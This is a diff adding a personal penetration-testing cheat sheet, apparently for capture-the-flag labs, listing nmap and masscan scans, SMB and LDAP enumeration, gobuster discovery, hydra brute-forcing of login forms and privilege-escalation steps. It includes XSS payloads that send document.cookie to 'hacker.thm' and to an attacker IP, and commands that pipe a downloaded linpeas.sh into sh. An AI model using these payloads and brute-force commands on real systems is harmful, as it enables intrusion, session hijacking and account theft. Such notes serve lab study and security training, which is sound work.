@@ -1,0 +1,177 @@
+ ==== [ NOTES ] ====
+ 
+ OS Version from TTL
+ 64 	Linux
+ 127 	Windows
+ 
+
+ ==== [ ENUMERATION ] ====
+ === [ NMAP ] ===
+
+ ## Light Scan - Normal Timing
+ nmap -sC -sV -oA nmap-scan <host ip>
+	without port parameter nmao scan fro classic port 
+	-sC script scan default ( non intrusive )
+	-sV service scan
+	-oA Save in 3 major format
+
+ ## Fastest Scan - Normal Timing but Hi Packet Rate
+ nmap -Pn -p- --min-rate 2000 -sC -sV -oA nmap-scan.txt <host ip>
+ 	-Pn ignore if host is up 
+	-p- All ports
+
+ ## Faster scan -  My be dropped
+ sudo nmap -Pn -p- -A --min-rate 5000 -oN scan.txt <target_ip>
+ 	-Pn ignore if host is up 
+	-p- All ports
+	-A version scan
+
+ ## Nmap fast scan for the most 1000tcp ports used
+ nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
+ -sV	Probe open ports to determine service/version info
+ -sC: equivalent to --script=default
+
+
+ ## Nmap fast scan for all the ports
+ nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
+
+ ## Nmap fast scan for all the ports slower to avoid failures due to -T4
+ nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>
+	
+
+ ## UDP Scan - Do not check for version
+ nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
+
+ -sU	UDP Scan
+ -sV	Probe open ports to determine service/version info
+ --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
+ -F	Fast mode - Scan fewer ports than the default scan
+ -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
+
+ ## All scan without DNS and save
+ nmap -sV -sC -O -n -oA nmapscan 192.168.0.1/24
+	-sV: Probe open ports to determine service/version info
+	-sC: equivalent to --script=default
+	-O: Enable OS detection
+	-n/-R: Never do DNS resolution/Always resolve [default: sometimes]
+	-oA <basename>: Output in the three major formats at once
+
+sudo nmap -Pn -sU --top-ports 500 -A -T4 -oN udp-scan.txt <target_ip>
+
+
+ nmap -PE -PM -PP -sn -n 199.66.11.0/24 
+
+ nmap -sC -sV -T4 10.129.37.195 -p- -A -o nmapScan.txt
+
+ nmap -sS -Pn -F MACHINE_IP
+      -sS -- Stealth (SYN) Scan 
+	  -Pn --> ignore no-response
+	  -F --> Scan 100 common ports
+
+
+ === [ MASSSCAN ] ===
+ masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
+
+ === [ UNICORNSCAN ] ===
+ unicornscan
+
+ === [ NETDISCOVER ] ===
+
+  netdiscover -r <Network> #ARP requests (Discover IPs)
+
+ ==== [ SMB ENUMERATION ] ====
+ 
+ smbclient -L <IP>
+
+ enum4linux
+
+nbtscan -r 192.168.0.1/24 #Search in Domain
+
+ ==== [ Active Directory Scan ] ====
+ === [ ldapsearch ] ===
+ ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 ( ATTENZIONE ALLA SINTASSI --> POTREBBE ESSERE DIFFERENTE )
+	-x	use simple auth
+	-b 	basename domain
+	-H  ldap server 
+	
+ ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 '(objectClass=Person)' sAMAccountName
+	'(objectClass=Person|User)'	query for element classified as person or user
+	sAMAccountName			restrict query to account name only
+ '{ print $2 }' 
+ 
+ ===[ WINDAPSEARCH ] ===
+ === [ RPCCLIENT ] === 
+ rpcclient -N -U "" 10.10.10.161 ( ATTENZIONE ALLA SINTASSI --> POTREBBE ESSERE DIFFERENTE )
+ 
+--- WEB DISCOVERY ---
+
+gobuster dir -u http://rick.thm -w /usr/share/wordlists/dirb/common.txt -t 100 -q -o ~/Downloads/MrRobot/gobuster_scan.txt
+
+gobuster dir -u http://10.10.10.12 -w /usr/share/wordlists/dirb/common.txt -t 100 -x .php -q -o ~/Downloads/MrRobot/gobuster_scan.txt
+
+gobuster vhost -u http://10.10.10.12 -w /usr/share/wordlists/dirb/common.txt -t 100 -q -o ~/Downloads/MrRobot/gobuster_scan.txt
+
+wfuzz
+
+feroxbuster
+
+
+
+---------------------------------------------------
+fase 2a - Scanning WebServer
+	-> XSS
+	-> SSTI
+	-> Command Injection
+	
+fase 2b - Scanning Database
+	-> SQLi
+		-> in-Band
+			-> error
+			-> blind
+			-> timed
+
+
+xss injection
+<script>alert('XSS');</script>
+""><script>alert('XSS');</script>
+
+
+xss cookie stealing
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+<img src=x onerror=this.src="http://10.10.14.27:9001/"+btoa(document.cookie);>
+
+
+--- PASSWORD  ---
+cracking 
+hashid
+hashcat
+john
+
+ ===[HYDRA]===
+ 
+hydra -l admin -P pass.txt 192.10.10.02 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login!"
+-l <right/correct or test user>  -P <dictionary of passwords>
+it is used to bruteforce login with a dictionary file of password like rockyou.txt
+ 
+hydra -L fsocity.dic -p test 10.10.49.116 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:invalid username" -t 30 
+-L <dictionary of usernames> -p <fake test password> 
+it is used to find the username ( invalid username was the error using admin as username . it could have been invalid username or password but in this case... )
+
+-l: specifies the username list or a single username
+-P: specifies the password list or a single password
+<target>: the target hostname or IP address
+<method>: the service module (e.g., http-post-form)
+"<path>:<form_data>:<failure_string>": the login form parameters and failure string
+
+## search for suid files 
+find / -perm +6000 2>/dev/null | grep '/bin/'
+find / -perm -4000 2>/dev/null
+
+
+===[Privilege Escalation]===
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+sudo -l #Check commands you can execute with sudo
+
+
